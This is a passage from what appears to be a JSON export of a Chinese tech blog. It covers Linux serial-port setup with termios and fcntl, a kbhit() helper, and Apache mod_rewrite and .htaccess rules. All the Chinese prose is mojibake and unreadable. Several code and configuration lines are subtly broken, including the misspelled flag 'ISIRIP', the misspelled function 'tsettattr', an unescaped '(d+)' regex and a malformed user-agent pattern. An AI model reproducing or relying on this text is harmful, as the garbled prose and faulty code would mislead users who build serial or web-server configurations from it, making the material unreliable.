å¾—åˆ°è¾“å‡ºé€Ÿåº¦Cfsetispeed è®¾ç½®è¾“å…¥é€Ÿåº¦Cfsetospeed è®¾ç½®è¾“å‡ºé€Ÿåº¦ 3ã€ä¸²å£çš„é…ç½® (1)ä¿å­˜åŸå…ˆä¸²å£é…ç½®ä½¿ç”¨tcgetattr(fd,&amp; oldtio)å‡½æ•°ï¼š 12struct termiosnewtio,oldtio;tcgetattr(fd,&amp; oldtio); (2)æ¿€æ´»é€‰é¡¹æœ‰CLOCALå’ŒCREAD,ç”¨äºæœ¬åœ°è¿æ¥å’Œæ¥æ”¶ä½¿èƒ½ã€‚ 1newtio.c_cflag|=CLOCAL|CREAD; (3)è®¾ç½®æ³¢ç‰¹ç‡ï¼Œä½¿ç”¨å‡½æ•°cfsetispeedã€cfsetospeed 12cfsetispeed(&amp;newtio,B115200);cfsetospeed(&amp;newtio,B115200); (4)è®¾ç½®æ•°æ®ä½ï¼Œéœ€ä½¿ç”¨æ©ç è®¾ç½®ã€‚ 12newtio.c_cflag&amp;=~CSIZE;newtio.c_cflag|=CS8; (5)è®¾ç½®å¥‡å¶æ ¡éªŒä½ï¼Œä½¿ç”¨c_cflagå’Œc_iflagã€‚ è®¾ç½®å¥‡æ ¡éªŒï¼š 123newtio.c_cflag|=PARENB; newtio.c_cflag|=PARODD;newtio.c_iflag|=(INPCK|ISTRIP); è®¾ç½®å¶æ ¡éªŒï¼š 123newtio.c_iflag|=(INPCK|ISIRIP);newtio.c_cflag|=PARENB;newtio.c_cflag&amp;=~PARODD; (6)è®¾ç½®åœæ­¢ä½ï¼Œé€šè¿‡æ¿€æ´»c_cflagä¸­çš„CSTOPBå®ç°ã€‚è‹¥åœæ­¢ä½ä¸º1ï¼Œåˆ™æ¸…é™¤CSTOPBï¼Œè‹¥åœæ­¢ä½ä¸º 2ï¼Œåˆ™æ¿€æ´»CSTOPBã€‚ 1newtio.c_cflag&amp;=~CSTOPB; (7)è®¾ç½®æœ€å°‘å­—ç¬¦å’Œç­‰å¾…æ—¶é—´ï¼Œå¯¹äºæ¥æ”¶å­—ç¬¦å’Œç­‰å¾…æ—¶é—´æ²¡æœ‰ç‰¹åˆ«è¦æ±‚æ—¶ï¼Œå¯è®¾ä¸º0ã€‚ 12newtio.c_cc[VTIME]=0;newtio.c_cc[VMIN]=0; (8)å¤„ç†è¦å†™å…¥çš„å¼•ç”¨å¯¹è±¡tcflushå‡½æ•°åˆ·æ¸…ï¼ˆæŠ›å¼ƒï¼‰è¾“å…¥ç¼“å­˜ï¼ˆç»ˆç«¯é©±åŠ¨ç¨‹åºå·²æ¥æ”¶åˆ°ï¼Œä½†ç”¨æˆ·ç¨‹åºå°šæœªè¯»ï¼‰æˆ–è¾“å‡ºç¼“å­˜ï¼ˆç”¨æˆ·ç¨‹åºå·²ç»å†™ï¼Œä½†å°šæœªå‘é€ï¼‰ã€‚ 1int tcflush(int filedes,int queue) queueæ•°åº”å½“æ˜¯ä¸‹åˆ—ä¸‰ä¸ªå¸¸æ•°ä¹‹ä¸€ï¼š 123TCIFLUSH åˆ·æ¸…è¾“å…¥é˜Ÿåˆ—ã€‚TCOFLUSHåˆ·æ¸…è¾“å‡ºé˜Ÿåˆ—ã€‚TCIOFLUSHåˆ·æ¸…è¾“å…¥ã€è¾“å‡ºé˜Ÿåˆ—ã€‚ å¦‚ï¼štcflush(fd,TCIFLUSH); (9)æ¿€æ´»é…ç½®ã€‚åœ¨å®Œæˆé…ç½®åï¼Œéœ€æ¿€æ´»é…ç½®ä½¿å…¶ç”Ÿæ•ˆã€‚ä½¿ç”¨tsettattr()å‡½æ•°ã€‚åŸå‹ï¼š 12int tcgetattr(int filedes,struct termios *termptr);int tcsetattr(int filedes,int opt,const struct termios* termptr); tcsetattrçš„å‚æ•°optä½¿æˆ‘ä»¬å¯ä»¥æŒ‡å®šåœ¨ä»€ä¹ˆæ—¶å€™æ–°çš„ç»ˆç«¯å±æ€§æ‰èµ·ä½œç”¨ã€‚optå¯ä»¥æŒ‡å®šä¸ºä¸‹åˆ—å¸¸æ•°ä¸­çš„ä¸€ä¸ªï¼š TCSANOWæ›´æ”¹ç«‹å³å‘ç”Ÿã€‚ TCSADRAINå‘é€äº†æ‰€æœ‰è¾“å‡ºåæ›´æ”¹æ‰å‘ç”Ÿã€‚è‹¥æ›´æ”¹è¾“å‡ºå‚æ•°åˆ™åº”ä½¿ç”¨æ­¤é€‰æ‹©é¡¹ã€‚ 4 ã€åœ¨é…ç½®å®Œä¸²å£çš„ç›¸å…³å±æ€§åï¼Œå°±å¯å¯¹ä¸²å£è¿›è¡Œæ‰“å¼€,è¯»å†™æ“ä½œäº†ã€‚å…¶ä½¿ç”¨æ–¹å¼ä¸æ–‡ä»¶æ“ä½œä¸€æ ·ï¼ŒåŒºåˆ«åœ¨äºä¸²å£æ˜¯ä¸€ä¸ªç»ˆç«¯è®¾å¤‡. (1)æ‰“å¼€ä¸²å£ 1234fd=open(&quot;/dev/ttyS0&quot;,O_RDWR|O_NOCTTY |O_NDELAY);Openå‡½æ•°ä¸­é™¤æ™®é€šå‚æ•°å¤–,å¦æœ‰ä¸¤ä¸ªå‚æ•°O_NOCTTYå’ŒO_NDELAY.O_NOCTTY:é€šçŸ¥linuxç³»ç»Ÿ,è¿™ä¸ªç¨‹åºä¸ä¼šæˆä¸ºè¿™ä¸ªç«¯å£çš„æ§åˆ¶ç»ˆç«¯ã€‚O_NDELAY:é€šçŸ¥linuxç³»ç»Ÿä¸å…³å¿ƒDCDä¿¡å·çº¿æ‰€å¤„çš„çŠ¶æ€(ç«¯å£çš„å¦ä¸€ç«¯æ˜¯å¦æ¿€æ´»æˆ–è€…åœæ­¢ï¼‰ã€‚ (2)æ¢å¤ä¸²å£çš„çŠ¶æ€ä¸ºé˜»å¡çŠ¶æ€,ç”¨äºç­‰å¾…ä¸²å£æ•°æ®çš„è¯»å…¥ã€‚ç”¨fcntlå‡½æ•°: 1fcntl(fd,F_SETFL,0ï¼‰; (3)æ¥ç€,æµ‹è¯•æ‰“å¼€çš„æ–‡ä»¶æè¿°åºœæ˜¯å¦å¼•ç”¨ä¸€ä¸ªç»ˆç«¯è®¾å¤‡,ä»¥è¿›ä¸€æ­¥ç¡®è®¤ä¸²å£æ˜¯å¦æ­£ç¡®æ‰“å¼€. 1isatty(STDIN_FILENO); (4)ä¸²å£çš„è¯»å†™ä¸æ™®é€šæ–‡ä»¶ä¸€æ ·,ä½¿ç”¨read,writeå‡½æ•°. 12read(fd,buf,8);write(fd,buf,8); kbhit()1234567891011121314151617181920212223int kbhit() //æ£€æµ‹é”®ç›˜æ˜¯å¦æœ‰è¾“å…¥&#123; struct termios oldt, newt; //æ§åˆ¶ç»ˆç«¯çŠ¶æ€çš„æ•°æ®ç»“æ„ int ch; int oldf; tcgetattr(STDIN_FILENO, &amp;oldt); //å¾—åˆ°å½“å‰ç»ˆç«¯çš„çŠ¶æ€ newt = oldt; //è®¾ç½®æ–°çš„ç»ˆç«¯å±æ€§ï¼šICANONå’ŒECHOå–åï¼Œè¡¨ç¤ºå…³é—­è¾“å…¥è¡Œç¼–è¾‘æ¨¡å¼ï¼Œå³èƒ½å¤Ÿç›´æ¥è¯»å…¥å­—ç¬¦ newt.c_lflag &amp;= ~(ICANON | ECHO); //ICANONï¼šå¦‚æœåœ¨è¾“å…¥ä¸­çœ‹åˆ°&apos;\\n&apos;æˆ–è€…&apos;EOF&apos;ï¼Œä¼šè¿”å›ç¼“å†²åŒºå†…å®¹ //ECHOï¼šæ§åˆ¶å›æ˜¾ tcsetattr(STDIN_FILENO, TCSANOW, &amp;newt); //TSCSANOWï¼šå‘Šè¯‰å‡½æ•°ç«‹å³æ”¹å˜ç»ˆç«¯çš„STDIN_FILENOçš„å±æ€§å€¼ oldf = fcntl(STDIN_FILENO, F_GETFL, 0); //è·å–flagsï¼Œå³openå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•° //fcntl()çš„è¿”å›å€¼ä¸å‘½ä»¤æœ‰å…³ã€‚å¦‚æœå‡ºé”™ï¼Œæ‰€æœ‰å‘½ä»¤éƒ½è¿”å›ï¼1ï¼Œå¦‚æœæˆåŠŸåˆ™è¿”å›æŸä¸ªå…¶ä»–å€¼ fcntl(STDIN_FILENO, F_SETFL, oldf | O_NONBLOCK); //å¢åŠ ä¸€ä¸ªflagsï¼ŒæŠŠæ–‡ä»¶è®¾ç½®æˆéé˜»å¡ //F_SETFLè®¾ç½®æ–‡ä»¶çŠ¶æ€æ ‡è®° ch = getchar(); tcsetattr(STDIN_FILENO, TCSANOW, &amp;oldt); //æ¢å¤ç»ˆç«¯è®¾ç½® fcntl(STDIN_FILENO, F_SETFL, oldf); if(ch != EOF) &#123; ungetc(ch, stdin); //æŠŠå­—ç¬¦é€€å›åˆ°è¾“å…¥æµ return 1; &#125; return 0;&#125; fcntl()1ã€è·å–æ–‡ä»¶çš„flagsï¼Œå³openå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°: 1flags = fcntl(fd,F_GETFL,0); 2ã€è®¾ç½®æ–‡ä»¶çš„flags: 1fcntl(fd,F_SETFL,flags); 3ã€å¢åŠ æ–‡ä»¶çš„æŸä¸ªflagsï¼Œæ¯”å¦‚æ–‡ä»¶æ˜¯é˜»å¡çš„ï¼Œæƒ³è®¾ç½®æˆéé˜»å¡: 12345flags = fcntl(fd,F_GETFL,0);flags |= O_NONBLOCK;fcntl(fd,F_SETFL,flags); 4ã€å–æ¶ˆæ–‡ä»¶çš„æŸä¸ªflagsï¼Œæ¯”å¦‚æ–‡ä»¶æ˜¯éé˜»å¡çš„ï¼Œæƒ³è®¾ç½®æˆä¸ºé˜»å¡: 12345flags = fcntl(fd,F_GETFL,0);flags &amp;= ~O_NONBLOCK;fcntl(fd,F_SETFL,flags); å‚è€ƒç½‘ç«™ï¼šhttps://blog.csdn.net/g1036583997/article/details/41277949https://www.cnblogs.com/dartagnan/archive/2013/04/25/3042417.htmlhttps://blog.csdn.net/DiegoTJ/article/details/5454917https://gezhenzhen.wikispaces.com/Linux%E4%B8%B2%E5%8F%A3%E9%80%9A%E4%BF%A1%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86http://www.codexiu.cn/linux/blog/21923/https://blog.csdn.net/liangxiaozhang/article/details/8202965","categories":[],"tags":[{"name":"c","slug":"c","permalink":"https://qianfei11.github.io/tags/c/"},{"name":"linux","slug":"linux","permalink":"https://qianfei11.github.io/tags/linux/"}]},{"title":"Apache Rewriteï¼ˆè·¯ç”±é‡å†™ï¼‰","slug":"Apache-Rewriteï¼ˆè·¯ç”±é‡å†™ï¼‰","date":"2018-05-16T05:36:06.000Z","updated":"2019-02-03T10:23:57.833Z","comments":true,"path":"2018/05/16/Apache-Rewriteï¼ˆè·¯ç”±é‡å†™ï¼‰/","link":"","permalink":"https://qianfei11.github.io/2018/05/16/Apache-Rewriteï¼ˆè·¯ç”±é‡å†™ï¼‰/","excerpt":"Apache Rewriteèƒ½å¤Ÿå®ç°URLçš„è·³è½¬å’Œéšè—çœŸå®åœ°å€ã€‚å®ƒåŸºäºPerlè¯­è¨€çš„æ­£åˆ™è¡¨è¾¾å¼è§„èŒƒã€‚å¹³æ—¶å¸®åŠ©æˆ‘ä»¬å®ç°æ‹Ÿé™æ€ï¼Œæ‹Ÿç›®å½•ï¼ŒåŸŸåè·³è½¬ï¼Œé˜²æ­¢ç›—é“¾ç­‰ã€‚","text":"Apache Rewriteèƒ½å¤Ÿå®ç°URLçš„è·³è½¬å’Œéšè—çœŸå®åœ°å€ã€‚å®ƒåŸºäºPerlè¯­è¨€çš„æ­£åˆ™è¡¨è¾¾å¼è§„èŒƒã€‚å¹³æ—¶å¸®åŠ©æˆ‘ä»¬å®ç°æ‹Ÿé™æ€ï¼Œæ‹Ÿç›®å½•ï¼ŒåŸŸåè·³è½¬ï¼Œé˜²æ­¢ç›—é“¾ç­‰ã€‚ ç†è§£Apache Rewriteçš„ä¸‰ä¸ªæ ¸å¿ƒRewriteEngineè¿™ä¸ªæ˜¯rewriteåŠŸèƒ½çš„æ€»å¼€å…³ï¼Œç”¨æ¥å¼€å¯æ˜¯å¦å¯åŠ¨url rewriteã€‚ 1RewriteEngine on RewriteCondRewriteCondå°±æ˜¯ä¸€ä¸ªè¿‡æ»¤æ¡ä»¶ï¼Œç®€å•æ¥è¯´ï¼Œå½“URLæ»¡è¶³RewriteCondé…ç½®çš„æ¡ä»¶çš„æƒ…å†µï¼Œå°±ä¼šæ‰§è¡ŒRewriteCondä¸‹é¢ç´§é‚»çš„RewriteRuleè¯­å¥ã€‚ RewriteCond å’Œ RewriteRule æ˜¯ä¸Šä¸‹å¯¹åº”çš„å…³ç³»ã€‚å¯ä»¥æœ‰1ä¸ªæˆ–è€…å¥½å‡ ä¸ªRewriteCondæ¥åŒ¹é…ä¸€ä¸ªRewriteRuleã€‚ RewriteCond %{å¾…æµ‹è¯•é¡¹ç›®} æ­£åˆ™è¡¨è¾¾å¼æ¡ä»¶ã€‚ 123RewriteEngine onRewriteCond %&#123;HTTP_USER_AGENT&#125; ^Mozilla//5/.0.*RewriteRule index.php index.m.php å¦‚æœè®¾ç½®ä¸Šé¢çš„åŒ¹é…è§„åˆ™ï¼Œåˆ°æ¥çš„httpè¯·æ±‚ä¸­çš„HTTP_USER_AGENTåŒ¹é…^Mozilla//5/.0.*æ­£åˆ™è¡¨è¾¾å¼çš„è¯ï¼Œåˆ™æ‰§è¡Œä¸‹é¢çš„RewriteRuleï¼Œä¹Ÿå°±æ˜¯è¯´è®¿é—®è·¯å¾„ä¼šè·³è½¬åˆ°index.m.phpè¿™ä¸ªæ–‡ä»¶ã€‚ RewriteRule1RewriteRule Pattern Substitution [flags] Patternæ˜¯ä¸€ä¸ªæ­£åˆ™åŒ¹é…ã€‚Substitutionæ˜¯åŒ¹é…çš„æ›¿æ¢ [flags]æ˜¯ä¸€äº›å‚æ•°é™åˆ¶ã€‚ 1RewriteRule ^room/video/(\\d+)\\.html web/index\\.php?c=room&amp;a=video&amp;r=$1 [QSA,NC,L] æ„æ€æ˜¯ ä»¥ roomå¼€å¤´çš„room/video/123.htmlè¿™æ ·å­ï¼Œå˜æˆweb/index.php?c=room&amp;a=video&amp;r=123ã€‚ 1RewriteRule \\.(jpg|gif) http://image.baidu.com/ [R,NC,L] æ„æ€æ˜¯ä»¥ä¸ºæ˜¯è®¿é—®.jpgæˆ–è€…gifçš„æ–‡ä»¶ï¼Œéƒ½ä¼šè°ƒæ•´åˆ°http://image.baidu.comã€‚ é‡å†™è§„åˆ™çš„ä½œç”¨èŒƒå›´1) å¯ä»¥ä½¿ç”¨åœ¨Apacheä¸»é…ç½®æ–‡ä»¶httpd.confä¸­ã€‚ 2) å¯ä»¥ä½¿ç”¨åœ¨httpd.confé‡Œå®šä¹‰çš„è™šæ‹Ÿä¸»æœºé…ç½®ä¸­ã€‚ 3) å¯ä»¥ä½¿ç”¨åœ¨åŸºæœ¬ç›®å½•çš„è·¨è¶Šé…ç½®æ–‡ä»¶.htaccessä¸­ã€‚ è¿™ä¸‰ç§æ–¹å¼ï¼Œéƒ½éœ€è¦åœ¨å†™è§„åˆ™å‰ï¼Œç”¨â€œRewriteEngine onâ€æŒ‡ä»¤æ¥æ‰“å¼€rewriteåŠŸèƒ½ã€‚ Apache Rewriteè§„åˆ™ä¿®æ­£ç¬¦1) R=code å¼ºåˆ¶å¤–éƒ¨é‡å®šå‘ å¼ºåˆ¶åœ¨æ›¿ä»£å­—ç¬¦ä¸²åŠ ä¸Šhttp://thishost[:thisport]/å‰ç¼€é‡å®šå‘åˆ°å¤–éƒ¨çš„URLã€‚å¦‚æœcodeä¸æŒ‡å®šï¼Œå°†ç”¨ç¼ºçœçš„302 HTTPçŠ¶æ€ç ã€‚ 1) F(force URL to be forbidden)ç¦ç”¨URL,è¿”å›403HTTPçŠ¶æ€ç ã€‚ 2) G(force URL to be gone) å¼ºåˆ¶URLä¸ºGONEï¼Œè¿”å›410HTTPçŠ¶æ€ç ã€‚ 3) P(force proxy) å¼ºåˆ¶ä½¿ç”¨ä»£ç†è½¬å‘ã€‚ 4) L(last rule) è¡¨æ˜å½“å‰è§„åˆ™æ˜¯æœ€åä¸€æ¡è§„åˆ™ï¼Œåœæ­¢åˆ†æä»¥åè§„åˆ™çš„é‡å†™ã€‚ 5) N(next round) é‡æ–°ä»ç¬¬ä¸€æ¡è§„åˆ™å¼€å§‹è¿è¡Œé‡å†™è¿‡ç¨‹ã€‚ 6) C(chained with next rule) ä¸ä¸‹ä¸€æ¡è§„åˆ™å…³è” å¦‚æœè§„åˆ™åŒ¹é…åˆ™æ­£å¸¸å¤„ç†ï¼Œè¯¥æ ‡å¿—æ— æ•ˆï¼Œå¦‚æœä¸åŒ¹é…ï¼Œé‚£ä¹ˆä¸‹é¢æ‰€æœ‰å…³è”çš„è§„åˆ™éƒ½è·³è¿‡ã€‚ 1) T=MIME-type(force MIME type) å¼ºåˆ¶MIMEç±»å‹ã€‚ 2) NS (used only if no internal sub-request) åªç”¨äºä¸æ˜¯å†…éƒ¨å­è¯·æ±‚ã€‚ 3) NC(no case) ä¸åŒºåˆ†å¤§å°å†™ã€‚ 4) QSA(query string append) è¿½åŠ è¯·æ±‚å­—ç¬¦ä¸²ã€‚ 5) NE(no URI escaping of output) ä¸åœ¨è¾“å‡ºè½¬ä¹‰ç‰¹æ®Šå­—ç¬¦ã€‚ ä¾‹å¦‚ï¼š 1RewriteRule /foo/(.*) /bar?arg=P1%3d$1 [R,NE] #å°†èƒ½æ­£ç¡®çš„å°†/foo/zooè½¬æ¢æˆ/bar?arg=P1=zoo 13) PT(pass through to next handler) ä¼ é€’ç»™ä¸‹ä¸€ä¸ªå¤„ç†ã€‚ ä¾‹å¦‚ï¼š 12RewriteRule ^/abc(.*) /def$1 [PT] # å°†ä¼šäº¤ç»™/defè§„åˆ™å¤„ç†Alias /def /ghi 14) S=num(skip next rule(s)) è·³è¿‡numæ¡è§„åˆ™ã€‚ 15) E=VAR:VAL(set environment variable) è®¾ç½®ç¯å¢ƒå˜é‡ã€‚ æ³¨ï¼šPæ˜¯ä»£ç†æ¨¡å¼è½¬å‘ï¼Œå¿…é¡»ç”¨urlå…¨ç§°ï¼Œå¹¶ä¸”è¦ä¿è¯modProxyæ‰“å¼€ï¼Œä¹Ÿå°±æ˜¯ä¸‹é¢httpd.confä¸­çš„å¦‚ä¸‹ä¸¤ä¸ªæŒ‡ä»¤ï¼š 12LoadModule proxy_module modules/mod_proxy.soLoadModule proxy_http_module modules/mod_proxy_http.so å¦‚æœå¯¹åº”proxyæ¨¡å—æ²¡åŠ è½½ï¼Œåˆ™ä¼šå‡ºç°403ç¦æ­¢é¡µé¢ã€‚ ç‰¹æ®Šå­—ç¬¦çš„å«ä¹‰*ä»£è¡¨å‰é¢0æˆ–æ›´å¤šä¸ªå­—ç¬¦ã€‚ +ä»£è¡¨å‰é¢1æˆ–æ›´å¤šä¸ªå­—ç¬¦ã€‚ ï¼Ÿä»£è¡¨å‰é¢0æˆ–1ä¸ªå­—ç¬¦ã€‚ ^ä»£è¡¨å­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½®ã€‚ $ä»£è¡¨å­—ç¬¦ä¸²ç»“æŸçš„ä½ç½®ã€‚ ã€‚ä¸ºé€šé…ç¬¦ï¼Œä»£è¡¨ä»»ä½•å­—ç¬¦ã€‚ \\å°†è·Ÿåœ¨å…¶åçš„å­—ç¬¦è¿˜åŸä¸ºå­—ç¬¦æœ¬èº«ï¼Œä¾‹å¦‚â€œ+â€ä»£è¡¨çš„å°±æ˜¯â€œ+â€ï¼Œè€Œéå…¶å®ƒæ„æ€ã€‚ ^åœ¨æ–¹æ‹¬å·é‡Œè¡¨ç¤ºéçš„æ„æ€ã€‚ä¾‹å¦‚ï¼»^.ï¼½ä»£è¡¨éé€šé…ç¬¦ã€‚ htaccess.htaccessæ–‡ä»¶(æˆ–è€…â€åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶â€ï¼‰,å…¨ç§°æ˜¯Hypertext Access(è¶…æ–‡æœ¬å…¥å£)ã€‚æä¾›äº†é’ˆå¯¹ç›®å½•æ”¹å˜é…ç½®çš„æ–¹æ³•ï¼Œ å³ï¼Œåœ¨ä¸€ä¸ªç‰¹å®šçš„æ–‡æ¡£ç›®å½•ä¸­æ”¾ç½®ä¸€ä¸ªåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªæŒ‡ä»¤çš„æ–‡ä»¶ï¼Œ ä»¥ä½œç”¨äºæ­¤ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ã€‚ä½œä¸ºç”¨æˆ·ï¼Œæ‰€èƒ½ä½¿ç”¨çš„å‘½ä»¤å—åˆ°é™åˆ¶ã€‚ç®¡ç†å‘˜å¯ä»¥é€šè¿‡Apacheçš„AllowOverrideæŒ‡ä»¤æ¥è®¾ç½®ã€‚æ¦‚è¿°æ¥è¯´ï¼Œhtaccessæ–‡ä»¶æ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡htaccessæ–‡ä»¶ï¼Œå¯ä»¥å¸®æˆ‘ä»¬å®ç°ï¼šç½‘é¡µ301é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€æ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸/é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½ã€‚ Apache Rewriteçš„æ–¹å¼å°†apacheçš„é…ç½®æ–‡ä»¶httpd.confä¸­ 1#LoadModule rewrite_module modules/mod_rewrite.so å‰çš„â€™#â€™å»æ‰ã€‚æ‰¾åˆ° â€˜AllowOverride Noneâ€™ æ”¹æˆ â€˜AllowOverride Allâ€™ã€‚ æ³¨ï¼šâ€™AllowOverrideâ€™çš„å‚æ•°è®¾ç½®ä¸ºâ€™ALLâ€™ï¼Œè¡¨ç¤ºæ•´å°æœåŠ¡å™¨ä¸Šéƒ½æ”¯æŒURLè§„åˆ™é‡å†™ã€‚ å¯¹äºä¸åŒçš„ç½‘å€ï¼Œéœ€è¦åœ¨APACHEä¸­å¢åŠ å¦‚ä¸‹å†…å®¹ï¼š 123456&lt;Directory â€œE:/Apache Group/Apache2/htdocs/leapsoulâ€&gt;/*å¼•å·é‡Œä»£è¡¨ä½ çš„webå­˜æ”¾ç›®å½•*//*å¦‚æœæ˜¯Linuxï¼Œåªè¦ä½ å®šä½åˆ°ä½ ç½‘ç«™ç›®å½•å³å¯*/Options FollowSymLinksAllowOverride None&lt;/Directory&gt; Apache æœåŠ¡å™¨è¦è¯»æ¯ä¸ªç½‘ç«™ä¸‹ç›®å½•ä¸‹çš„.htaccessæ–‡ä»¶ã€‚å¦‚æœæ²¡æœ‰è¿™ä¸ªæ–‡ä»¶ï¼Œæˆ–è€…è¿™ä¸ªæ–‡æ¡£æ²¡æœ‰å®šä¹‰ä»»ä½•å…³äºURLé‡å†™çš„è§„åˆ™å°±ä¸ä¼šæœ‰ä»»ä½•æ•ˆæœã€‚ åªè¦å¯ç”¨mod_rewriteï¼Œç„¶åç®€å•çš„é€šè¿‡ä¸€ä¸ª.htaccessæ–‡ä»¶å†åŠ ä¸Šä¸€äº›ç®€å•çš„è§„åˆ™å°±å¯ä»¥ç§»é™¤URLä¸­çš„ index.php äº†ã€‚ é’ˆå¯¹æ•´ä¸ªapacheæœåŠ¡å™¨çš„é…ç½®åœ¨ç½‘ç«™é…ç½®ä¸‹åŠ å…¥ 123RewriteEngine onRewriteRule index.html index.phpRewriteRule (d+).html$ info.php?id=$1 å³é€šè¿‡index.htmlè®¿é—®å°±æ˜¯index.phpï¼›é€šè¿‡1.htmlè®¿é—®å°±æ˜¯info.php?id=1ã€‚ é’ˆå¯¹apacheæœåŠ¡å™¨ä¸‹çš„æŸä¸€ç›®å½•çš„é…ç½®åœ¨.htaccessæ–‡ä»¶ä¸­åŠ å…¥ 123RewriteEngine onRewriteCond %&#123;REQUEST_FILENAME&#125; !-f#è¿™é‡Œå°†é™¤äº†å®é™…æ–‡ä»¶ä»¥ä¸ºçš„æ‰€æœ‰å…¶ä»–è¯·æ±‚éƒ½æŒ‡å‘ä¸‹è¡Œä»£ç ç»™å‡ºçš„è„šæœ¬ï¼Œè¿™é‡Œæ˜¯index.phpRewriteRule .* index.php åœ¨Windowsèµ„æºç®¡ç†å™¨é‡Œé¢ä¸å…è®¸ä½ å»ºç«‹.htaccessè¿™æ ·åªæœ‰æ‰©å±•åçš„æ–‡ä»¶ã€‚æ‰€ä»¥ä½ å¿…é¡»å…ˆå°†æ–‡ä»¶ä¿å­˜ä¸ºå…¶ä»–åå­—ï¼Œä¾‹å¦‚app.htaccessã€‚ç„¶åè¿›å…¥cmdï¼Œè¾“å…¥ren a.htaccess .htaccesså‘½ä»¤æ¥å¯¹æ–‡ä»¶æ”¹åã€‚æˆ–è€…æ–°å»ºä¸€ä¸ªè®°äº‹æœ¬ï¼Œå¦å­˜ä¸º.htaccesså³å¯ã€‚ ä¾‹å­å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨é‡å®šå‘åˆ°404é¡µé¢123RewriteCond %&#123;REQUEST_FILENAME&#125; !-fRewriteCond %&#123;REQUEST_FILENAME&#125; !-dRewriteRule .? /404.php [L] è¿™é‡Œ-fåŒ¹é…çš„æ˜¯å­˜åœ¨çš„æ–‡ä»¶åï¼Œ-dåŒ¹é…çš„å­˜åœ¨çš„è·¯å¾„åã€‚è¿™æ®µä»£ç åœ¨è¿›è¡Œ404é‡å®šå‘ä¹‹å‰ï¼Œä¼šåˆ¤æ–­ä½ çš„æ–‡ä»¶åä»¥åŠè·¯å¾„åæ˜¯å¦å­˜åœ¨ã€è¯·æ³¨æ„è¿™é‡Œã€‘ã€‚ä½ è¿˜å¯ä»¥åœ¨404é¡µé¢ä¸ŠåŠ ä¸€ä¸ª?url=$1å‚æ•°ï¼š 1RewriteRule ^/?(.*)$ /404.php?url=$1 [L] åŸŸåè·³è½¬123RewriteEngine onRewriteCond %&#123;HTTP_HOST&#125; ^en.smilejay.com [NC]RewriteRule ^(.*) http://www.smilejay.com/ [L] é…ç½®å¤šç”¨æˆ·è™šæ‹ŸæœåŠ¡å™¨12345678910111213ServerAdmin webmaster@kiya.usDocumentRoot /home/www/www.kiya.usServerName dns.kiya.usServerAlias dns.kiya.us kiya.us *.kiya.usCustomLog /var/log/httpd/osa/access_log.logâ€ commonErrorLog /var/log/httpd/osa/error_log.logâ€AllowOverride NoneOrder deny,allowRewriteEngine onRewriteCond %&#123;HTTP_HOST&#125; ^[^.]+.kiya.(cn|us)$RewriteRule ^(.+) %&#123;HTTP_HOST&#125;$1 [C]RewriteRule ^([^.]+).kiya.(cn|us)(.*)$ /home/www/www.kiya.us/sylvan$3?un=$1&amp;%&#123;QUERY_STRING&#125; [L] é€šè¿‡Rewriteé˜²æ­¢ç›—é“¾1234RewriteEngine OnRewriteCond %&#123;HTTP_REFERER&#125; chinaz.com [NC]RewriteCond %&#123;HTTP_REFERER&#125; im286.com [NC]RewriteRule .*\\.(jpg|jpeg|gif|png|rar|zip|txt|ace|torrent|gz|swf)$ http://www.xxx.com/fuck.png [R,NC,L] å±è”½IEå’ŒOperaæµè§ˆå™¨1234RewriteEngine onRewriteCond %&#123;HTTP_USER_AGENT&#125; ^MSIE [NC,OR]RewriteCond %&#123;HTTP_USER_AGENT&#125; ^Opera [NC]RewriteRule ^.* â€“ [F,L] #è¿™é‡Œ&quot;-&quot;è¡¨ç¤ºæ²¡æœ‰æ›¿æ¢ï¼Œæµè§ˆå™¨ä¸ºIEå’ŒOperaçš„è®¿å®¢å°†è¢«ç¦æ­¢è®¿é—®ã€‚ è‡ªåŠ¨æ·»åŠ .phpæ‰©å±•ååŠè‡ªåŠ¨æ¢.htmlåˆ°.phpæ‰©å±•å1234567RewriteEngine OnRewriteBase /testRewriteCond %&#123;REQUEST_FILENAME&#125;.php -fRewriteRule ([^/]+)$ /test/$1.php#for example: /test/admin =&gt; /test/admin.phpRewriteRule ([^/]+)\\.html$ /test/$1.php [L]#for example: /test/admin.html =&gt; /test/admin.php é™åˆ¶ä»…æ˜¾ç¤ºå›¾ç‰‡123456#é™åˆ¶ç›®å½•åªèƒ½æ˜¾ç¤ºå›¾ç‰‡&lt; IfModule mod_rewrite.c&gt;RewriteEngine onRewriteCond %&#123;REQUEST_FILENAME&#125; !^.*\\.(gif|jpg|jpeg|png|swf)$RewriteRule .*$ â€“ [F,L]&lt; /IfModule&gt; éšè—index.php12345678910Options +FollowSymLinksIndexIgnore */*RewriteEngine on# if a directory or a file exists, use it directlyRewriteCond %&#123;REQUEST_FILENAME&#125; !-fRewriteCond %&#123;REQUEST_FILENAME&#125; !-d# otherwise forward it to index.phpRewriteRule . index.php 1234RewriteEngine OnRewriteCond %&#123;REQUEST_FILENAME&#125; !-fRewriteCond %&#123;REQUEST_FILENAME&#125; !-dRewriteRule ^(.*)$ index.php/$1 [L] 